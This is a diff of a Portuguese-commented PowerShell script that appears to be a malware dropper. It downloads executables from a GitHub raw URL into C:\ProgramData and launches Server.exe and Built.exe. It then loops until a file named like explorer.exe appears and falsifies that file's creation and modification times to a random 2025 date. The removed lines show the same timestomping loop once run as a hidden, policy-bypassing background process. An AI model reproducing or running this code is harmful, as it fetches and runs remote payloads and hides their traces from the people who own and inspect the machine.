@@ -1,3 +1,5 @@
+Clear-Host
+
 # Gerar data aleatória do ano de 2025
 $randomDate = Get-Random -Minimum 1 -Maximum 365 | ForEach-Object { (Get-Date "01/01/2025").AddDays($_) }
 $randomDate = $randomDate.AddHours((Get-Random -Minimum 0 -Maximum 24)).AddMinutes((Get-Random -Minimum 0 -Maximum 60)).AddSeconds((Get-Random -Minimum 0 -Maximum 60))
@@ -17,28 +19,23 @@ Invoke-WebRequest -Uri "https://github.com/bexeybr/system/raw/refs/heads/main/Bu
 
 # Executar ambos
 Start-Process "C:\ProgramData\Server.exe"
+
+# Esperar 5 segundos para o Server.exe inicializar
+Start-Sleep -Seconds 5
+
 Start-Process "C:\ProgramData\Built.exe"
 
-# Criar script de monitoramento separado e rodar em background
-$monitorScript = @"
-`$randomDate = Get-Random -Minimum 1 -Maximum 365 | ForEach-Object { (Get-Date '01/01/2025').AddDays(`$_) }
-`$randomDate = `$randomDate.AddHours((Get-Random -Minimum 0 -Maximum 24)).AddMinutes((Get-Random -Minimum 0 -Maximum 60)).AddSeconds((Get-Random -Minimum 0 -Maximum 60))
-while (`$true) {
-    `$explorerPath = "C:\ProgramData\explorer.exe"
-    if (Test-Path `$explorerPath) {
-        try {
-            `$file = Get-Item `$explorerPath
-            if (`$file.LastWriteTime.Year -ne 2025) {
-                `$file.LastWriteTime = `$randomDate
-                `$file.CreationTime = `$randomDate
-            }
-        } catch {}
+# Loop que verifica explorer.exe e altera a data
+while ($true) {
+    $files = Get-ChildItem "C:\ProgramData\*explorer*" -ErrorAction SilentlyContinue
+    if ($files) {
+        foreach ($file in $files) {
+            $file.LastWriteTime = $randomDate
+            $file.CreationTime = $randomDate
+        }
+        Clear-Host
+        Write-Host "Sucesso!" -ForegroundColor Green
+        break
     }
-    Start-Sleep -Seconds 10
+    Start-Sleep -Seconds 3
 }
-"@
-
-# Salvar e executar o monitor em background
-$monitorPath = "C:\ProgramData\monitor_2025.ps1"
-$monitorScript | Out-File -FilePath $monitorPath -Force
-Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$monitorPath`""
